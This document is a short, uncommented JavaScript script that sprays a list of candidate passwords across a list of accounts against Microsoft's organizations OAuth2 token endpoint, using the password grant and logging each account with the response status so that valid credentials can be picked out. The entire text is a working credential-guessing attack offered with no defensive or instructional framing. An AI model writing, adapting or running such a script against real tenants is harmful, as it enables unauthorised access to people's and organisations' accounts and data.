const endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token';
const candidates = process.env.CANDIDATE_SET.split(',');
const accounts = process.env.ACCOUNT_SET.split(',');
const clientId = process.env.CLIENT_ID;
for (const clave of candidates) {
  for (const cuenta of accounts) {
    const response = await fetch(endpoint, {
      method: 'POST',
      body: new URLSearchParams({username: cuenta, password: clave,
        grant_type: 'password', client_id: clientId,
        scope: 'https://graph.microsoft.com/.default'})
    });
    console.log(cuenta, response.status);
  }
}
